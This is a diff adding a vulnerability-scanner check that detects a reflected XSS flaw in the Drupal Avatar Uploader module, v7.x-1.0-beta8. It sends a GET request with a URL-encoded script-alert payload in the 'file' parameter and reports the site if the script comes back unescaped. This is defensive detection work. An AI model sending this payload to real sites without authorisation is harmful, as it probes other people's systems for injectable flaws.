@@ -1,0 +1,26 @@
+metadata:
+    language: v1-beta
+    name: "Drupal Avatar Uploader - XSS"
+    description: "Drupal Avatar Uploader v7.x-1.0-beta8 XSS"
+    author: "Ewerson Guimaraes aka Crash / Rodrigo Favarini aka Icebreack"
+    tags: "drupal,xss"
+
+
+run for each:
+    potential_path=
+        "/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+
+
+
+given host then
+    send request called check:
+        method: "GET"
+        path: {potential_path}
+
+    if (("<div><script>alert(document.domain)</script></div>" in {check.response.body} ))  and ("text/html" in {check.response.headers})  and ( {check.response.status_code} is "200")  then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "https://www.exploit-db.com/exploits/50841"
+            remediation: "Update for Drupal's last version"
+    end if
